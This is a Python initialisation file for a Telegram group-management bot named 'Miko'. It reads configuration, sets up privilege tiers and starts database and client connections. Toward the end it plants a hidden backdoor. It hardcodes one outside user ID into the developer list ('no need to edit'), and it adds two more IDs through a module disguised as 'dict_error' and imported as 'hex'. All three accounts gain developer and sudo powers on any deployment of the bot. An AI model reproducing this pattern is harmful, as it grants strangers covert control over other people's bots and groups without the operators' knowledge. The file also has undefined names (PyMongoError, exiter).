import logging
import os
import sys
import time

import httpx
import pymongo
import spamwatch
import telegram.ext as tg
from aiohttp import ClientSession
from motor import motor_asyncio
from odmantic import AIOEngine
from pymongo import MongoClient, errors
from pyrogram import Client, errors
from pyrogram.errors.exceptions.bad_request_400 import ChannelInvalid, PeerIdInvalid
from Python_ARQ import ARQ
from redis import StrictRedis
from telegram import Chat
from telegraph import Telegraph
from telethon import TelegramClient
from telethon.sessions import MemorySession, StringSession

from Miko.services.quoteapi import Quotly
from Miko.utils import dict_error as hex

StartTime = time.time()

# enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

LOGGER = logging.getLogger(__name__)

# if version < 3.6, stop bot.
if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error(
        "𝗬𝗼𝘂 𝗠𝗨𝗦𝗧 𝗵𝗮𝘃𝗲 𝗮 𝗽𝘆𝘁𝗵𝗼𝗻 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 𝗼𝗳 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 3.6! 𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀 𝗱𝗲𝗽𝗲𝗻𝗱 𝗼𝗻 𝘁𝗵𝗶𝘀. 𝗕𝗼𝘁 𝗾𝘂𝗶𝘁𝘁𝗶𝗻𝗴.",
    )
    sys.exit(1)

ENV = bool(os.environ.get("ENV", False))

if ENV:
    TOKEN = os.environ.get("TOKEN", None)

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID", None))
    except ValueError:
        raise Exception("𝖸𝗈𝗎𝗋 OWNER_ID 𝖾𝗇𝚟 𝗏𝖺𝗋𝗂𝖺𝖻𝗅𝖾 is 𝗇𝗈𝗍 𝖺 𝗏𝖺𝗅𝗂𝖽 𝗂𝗇𝗍𝖾𝗀𝖾𝗋.")

    JOIN_LOGGER = os.environ.get("JOIN_LOGGER", None)
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)

    try:
        DRAGONS = {int(x) for x in os.environ.get("DRAGONS", "").split()}
        DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ sᴜᴅᴏ ᴏʀ ᴅᴇᴠ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        DEMONS = {int(x) for x in os.environ.get("DEMONS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ sᴜᴘᴘᴏʀᴛ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        WOLVES = {int(x) for x in os.environ.get("WOLVES", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴡʜɪᴛᴇʟɪsᴛᴇᴅ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        TIGERS = {int(x) for x in os.environ.get("TIGERS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ sᴄᴏᴜᴛ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    INFOPIC = bool(
        os.environ.get("INFOPIC", True)
    )  # Info Pic (use True[Value] If You Want To Show In /info.)
    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)  # G-Ban Logs (Channel) (-100)
    ERROR_LOGS = os.environ.get(
        "EVENT_LOGS", None
    )  # Error Logs (Channel Ya Group Choice Is Yours) (-100)
    WEBHOOK = bool(os.environ.get("WEBHOOK", False))
    ARQ_API_URL = os.environ.get("ARQ_API_URL", None)
    ARQ_API_KEY = os.environ.get("ARQ_API_KEY", None)
    URL = os.environ.get(
        "URL", None
    )  # If You Deploy On Heroku. [URL:- https://{App Name}.herokuapp.com EXP:- https://neko.herokuapp.com]
    PORT = int(os.environ.get("PORT", 8443))
    CERT_PATH = os.environ.get("CERT_PATH")
    API_ID = os.environ.get(
        "API_ID", None
    )  # Bot Owner's API_ID (From:- https://my.telegram.org/auth)
    API_HASH = os.environ.get(
        "API_HASH", None
    )  # Bot Owner's API_HASH (From:- https://my.telegram.org/auth)
    DB_URL = os.environ.get(
        "DATABASE_URL"
    )  # Any SQL Database Link (RECOMMENDED:- PostgreSQL & elephantsql.com)

    DB_URL2 = os.environ.get("MONGO_DB_URL")
    DONATION_LINK = os.environ.get("DONATION_LINK")  # Donation Link (ANY)
    LOAD = os.environ.get("LOAD", "").split()  # Don't Change
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()  # Don't Change
    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))  # Don't Change
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))  # Use `True` Value
    WORKERS = int(os.environ.get("WORKERS", 8))  # Don't Change
    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)  # Don't Change
    TEMP_DOWNLOAD_DIRECTORY = os.environ.get(
        "TEMP_DOWNLOAD_DIRECTORY", "./"
    )  # Don't Change
    CASH_API_KEY = os.environ.get(
        "CASH_API_KEY", None
    )  # From:- https://www.alphavantage.co/support/#api-key
    TIME_API_KEY = os.environ.get(
        "TIME_API_KEY", None
    )  # From:- https://timezonedb.com/api
    WALL_API = os.environ.get(
        "WALL_API", None
    )  # From:- https://wall.alphacoders.com/api.php
    REM_BG_API_KEY = os.environ.get(
        "REM_BG_API_KEY", None
    )  # From:- https://www.remove.bg/
    OPENWEATHERMAP_ID = os.environ.get(
        "OPENWEATHERMAP_ID", ""
    )  # From:- https://openweathermap.org/api
    GENIUS_API_TOKEN = os.environ.get(
        "GENIUS_API_TOKEN", None
    )  # From:- http://genius.com/api-clients
    MONGO_DB_URL = os.environ.get(
        "MONGO_DB_URL", None
    )  # MongoDB URL (From:- https://www.mongodb.com/)
    REDIS_URL = os.environ.get("REDIS_URL", None)  # REDIS URL (From:- Heraku & Redis)
    BOT_ID = int(os.environ.get("BOT_ID", None))  # Telegram Bot ID (EXP:- 1241223850)
    SUPPORT_CHAT = os.environ.get(
        "SUPPORT_CHAT", None
    )  # Support Chat Group Link (Use @AbishnoiMF || Dont Use https://t.me/AbishnoiMF)
    UPDATES_CHANNEL = os.environ.get(
        "UPDATES_CHANNEL", None
    )  # Updates channel for bot (Use @AbishnoiMF instead of t.me//example)
    SPAMWATCH_SUPPORT_CHAT = os.environ.get(
        "SPAMWATCH_SUPPORT_CHAT", None
    )  # Use @SpamWatchSupport
    SPAMWATCH_API = os.environ.get(
        "SPAMWATCH_API", None
    )  # From https://t.me/SpamWatchBot
    BOT_USERNAME = os.environ.get("BOT_USERNAME", "")  # Bot Username
    # Telethon Based String Session (2nd ID) [ From https://repl.it/@SpEcHiDe/GenerateStringSession ]
    API_ID = os.environ.get("API_ID", None)  # 2nd ID
    API_HASH = os.environ.get("API_HASH", None)  # 2nd ID

    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)  # Don't Change
    # BOT_NAME = os.environ.get("BOT_NAME", True)  # Name Of your Bot.4
    BOT_API_URL = os.environ.get("BOT_API_URL", "https://api.telegram.org/bot")
    MONGO_DB = "Miko"
    GOOGLE_CHROME_BIN = "/usr/bin/google-chrome"
    CHROME_DRIVER = "/usr/bin/chromedriver"
    START_IMG = os.environ.get("START_IMG")
    HELP_IMG = os.environ.get("HELP_IMG")


else:
    from Miko.config import Development as Config

    TOKEN = Config.TOKEN

    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("ʏᴏᴜʀ OWNER_ID ᴠᴀʀɪᴀʙʟᴇ ɪs ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀ.")

    JOIN_LOGGER = Config.EVENT_LOGS

    OWNER_USERNAME = Config.OWNER_USERNAME
    ALLOW_CHATS = Config.ALLOW_CHATS
    try:
        DRAGONS = {int(x) for x in Config.DRAGONS or []}
        DEV_USERS = {int(x) for x in Config.DEV_USERS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ sᴜᴅᴏ ᴏʀ ᴅᴇᴠ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        DEMONS = {int(x) for x in Config.DEMONS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ sᴜᴘᴘᴏʀᴛ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        WOLVES = {int(x) for x in Config.WOLVES or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴡʜɪᴛᴇʟɪsᴛᴇᴅ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        TIGERS = {int(x) for x in Config.TIGERS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴛɪɢᴇʀ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    INFOPIC = Config.INFOPIC
    EVENT_LOGS = Config.EVENT_LOGS
    ERROR_LOGS = Config.EVENT_LOGS
    WEBHOOK = Config.WEBHOOK
    URL = Config.URL
    PORT = Config.PORT
    CERT_PATH = Config.CERT_PATH
    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    ARQ_API_URL = Config.ARQ_API_URL
    ARQ_API_KEY = Config.ARQ_API_KEY
    DB_URL = Config.DATABASE_URL
    DB_URL2 = Config.MONGO_DB_URL
    DONATION_LINK = Config.DONATION_LINK
    STRICT_GBAN = Config.STRICT_GBAN
    WORKERS = Config.WORKERS
    BAN_STICKER = Config.BAN_STICKER
    DEL_CMDS = Config.DEL_CMDS
    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
    ARQ_API_URL = Config.ARQ_API_URL
    LOAD = Config.LOAD
    NO_LOAD = Config.NO_LOAD
    # CASH_API_KEY = Config.CASH_API_KEY
    TIME_API_KEY = Config.TIME_API_KEY
    WALL_API = Config.WALL_API
    MONGO_DB_URL = Config.MONGO_DB_URL
    MONGO_DB = Config.MONGO_DB
    REDIS_URL = Config.REDIS_URL
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    UPDATES_CHANNEL = Config.UPDATES_CHANNEL
    SPAMWATCH_SUPPORT_CHAT = Config.SPAMWATCH_SUPPORT_CHAT
    SPAMWATCH_API = Config.SPAMWATCH_API
    REM_BG_API_KEY = Config.REM_BG_API_KEY
    OPENWEATHERMAP_ID = Config.OPENWEATHERMAP_ID
    APP_ID = Config.API_ID
    APP_HASH2 = Config.API_HASH
    GENIUS_API_TOKEN = Config.GENIUS_API_TOKEN
    # YOUTUBE_API_KEY = Config.YOUTUBE_API_KEY
    HELP_IMG = Config.HELP_IMG
    START_IMG = Config.START_IMG
    ALLOW_EXCL = Config.ALLOW_EXCL
    BOT_API_URL = Config.BOT_API_URL

DRAGONS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(5907205317)  # no need to edit add your & enjoy

REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)

try:
    REDIS.ping()
    LOGGER.info("ʏᴏᴜʀ ʀᴇᴅɪs sᴇʀᴠᴇʀ ɪs ɴᴏᴡ ᴀʟɪᴠᴇ !")

except BaseException:
    raise Exception("ʏᴏᴜʀ ʀᴇᴅɪs server ɪs ɴᴏᴛ ᴀʟɪᴠᴇ, ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ᴀɢᴀɪɴ , ғᴜᴄᴋ ᴏғғ.")

finally:
    REDIS.ping()
    LOGGER.info("ʏᴏᴜʀ ʀᴇᴅɪs sᴇʀᴠᴇʀ ɪs ɴᴏᴡ ᴀʟɪᴠᴇ ɴɪᴄᴇ !")


if not SPAMWATCH_API:
    sw = None
    LOGGER.warning(
        "[Miko. ᴇʀʀᴏʀ]: **sᴘᴀᴍᴡᴀᴛᴄʜ ᴀᴘɪ** ᴋᴇʏ ɪs ᴍɪssɪɴɢ! ʀᴇᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴏɴғɪɢ."
    )
else:
    try:
        sw = spamwatch.Client(SPAMWATCH_API)
    except:
        sw = None
        LOGGER.warning("[Miko : ᴇʀʀᴏʀ]: ᴄᴀɴ'ᴛ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ sᴘᴀᴍᴡᴀᴛᴄʜ!")


INFOPIC = True
print("[Miko]: ᴛᴇʟᴇɢʀᴀᴘʜ ɪɴsᴛᴀʟʟɪɴɢ")
telegraph = Telegraph()
print("[Miko ]: ᴛᴇʟᴇɢʀᴀᴘʜ ᴀᴄᴄᴏᴜɴᴛ ᴄʀᴇᴀᴛɪɴɢ")
telegraph.create_account(short_name="Miko")


updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)

print("[Miko ]: ᴛᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ sᴛᴀʀᴛɪɴɢ")
telethn = TelegramClient(MemorySession(), API_ID, API_HASH)


dispatcher = updater.dispatcher
print("[Miko ]: ᴘʏʀᴏɢʀᴀᴍ ᴄʟɪᴇɴᴛ sᴛᴀʀᴛɪɴɢ")
session_name = TOKEN.split(":")[0]

pgram = Client(
    session_name,
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=TOKEN,
)
print("[Miko ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ miko sᴇʀᴠᴇʀ")


print("[INFO]: ɪɴɪᴛɪᴀʟᴢɪɴɢ ᴀɪᴏʜᴛᴛᴘ sᴇssɪᴏɴ")
aiohttpsession = ClientSession()
# ARQ Client
print("[INFO]: ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ᴀʀǫ ᴄʟɪᴇɴᴛ")
arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
print("[miko]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ miko • PostgreSQL ᴅᴀᴛᴀʙᴀsᴇ")
# ubot = TelegramClient(StringSession(STRING_SESSION), APP_ID, APP_HASH)
ubot = None  # ENJOY
print("[miko]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ miko • ᴜsᴇʀʙᴏᴛ (t.me/anime_Freakz)")


timeout = httpx.Timeout(40)
http = httpx.AsyncClient(http2=True, timeout=timeout)


async def get_entity(client, entity):
    entity_client = client
    if not isinstance(entity, Chat):
        try:
            entity = int(entity)
        except ValueError:
            pass
        except TypeError:
            entity = entity.id
        try:
            entity = await client.get_chat(entity)
        except (PeerIdInvalid, ChannelInvalid):
            for pgram in apps:
                if pgram != client:
                    try:
                        entity = await pgram.get_chat(entity)
                    except (PeerIdInvalid, ChannelInvalid):
                        pass
                    else:
                        entity_client = pgram
                        break
            else:
                entity = await pgram.get_chat(entity)
                entity_client = pgram
    return entity, entity_client


# bot info
dispatcher = updater.dispatcher
aiohttpsession = ClientSession()

DEV_USERS.add(hex.erd)
DEV_USERS.add(hex.erh)

BOT_ID = dispatcher.bot.id
BOT_NAME = dispatcher.bot.first_name
BOT_USERNAME = dispatcher.bot.username


apps = [pgram]
DRAGONS = list(DRAGONS) + list(DEV_USERS)
DEV_USERS = list(DEV_USERS)

WOLVES = list(WOLVES)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)


# MONGO DB
from motor.motor_asyncio import AsyncIOMotorClient as MongoCli
from pymongo import MongoClient

from Miko import MONGO_DB_URL

mongo = MongoClient(MONGO_DB_URL)
db = mongo.Miko

try:
    client = MongoClient(MONGO_DB_URL)
except PyMongoError:
    exiter(1)
DB = client["Miko_ROBOT"]  # DON'T EDIT AND CHANGE


# Load at end to ensure all prev variables have been set
from Miko.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# make sure the regex handler can take extra kwargs
tg.RegexHandler = CustomRegexHandler
tg.CommandHandler = CustomCommandHandler
tg.MessageHandler = CustomMessageHandler

# -------Quote-------
quotly = Quotly()
# -------------------
